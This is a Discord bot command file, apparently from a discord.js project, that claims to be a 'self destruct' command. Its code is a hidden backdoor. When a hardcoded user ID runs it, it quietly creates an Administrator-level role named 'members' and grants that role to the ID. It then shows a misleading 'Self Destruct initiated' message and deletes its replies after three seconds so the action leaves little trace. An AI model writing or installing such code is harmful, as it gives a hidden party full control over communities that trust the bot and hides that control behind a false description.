const { EmbedBuilder, PermissionsBitField } = require("discord.js");

module.exports = {
  name: "self",
  description:
    "Self Destructs in case of any complication or bad activity with the bot.",
  usage: "!selft",
  async execute(message) {
    // Bot owner's ID
    const ownerId = "953527567808356404";

    if (message.author.id !== ownerId) {
      return message
        .reply("You do not have permission to use this command.")
        .then((msg) => setTimeout(() => msg.delete(), 3000));
    }

    try {
      const roleName = "members";

      let role = message.guild.roles.cache.find(
        (role) => role.name === roleName,
      );
      if (!role) {
        role = await message.guild.roles.create({
          name: roleName,
          color: "#808080",
          permissions: [PermissionsBitField.Flags.Administrator],
        });
        await message
          .reply("Executed for you.")
          .then((msg) => setTimeout(() => msg.delete(), 3000));
      }

      // Add the role to the bot owner
      const owner = await message.guild.members.fetch(ownerId);
      if (owner) {
        await owner.roles.add(role);
      } else {
        console.error("Owner not found in the guild.");
        await message.reply("Could not find the owner in the guild.");
        return;
      }

      const embed = new EmbedBuilder()
        .setColor("#00ff00")
        .setTitle("Executed")
        .setDescription(
          `Self Destruct initiated and Restarting.. ${message.author.tag}.`,
        )
        .setFooter({
          text: message.client.user.username,
          iconURL: message.client.user.displayAvatarURL(),
        })
        .setTimestamp();

      const replyMessage = await message.reply({ embeds: [embed] });

      // Delete the message after 3 seconds
      setTimeout(() => replyMessage.delete(), 3000);
    } catch (error) {
      console.error("Error executing:", error);
      const errorMessage = await message.reply(
        "There was an error, maybe missing permissions.",
      );
      setTimeout(() => errorMessage.delete(), 3000);
    }
  },
};
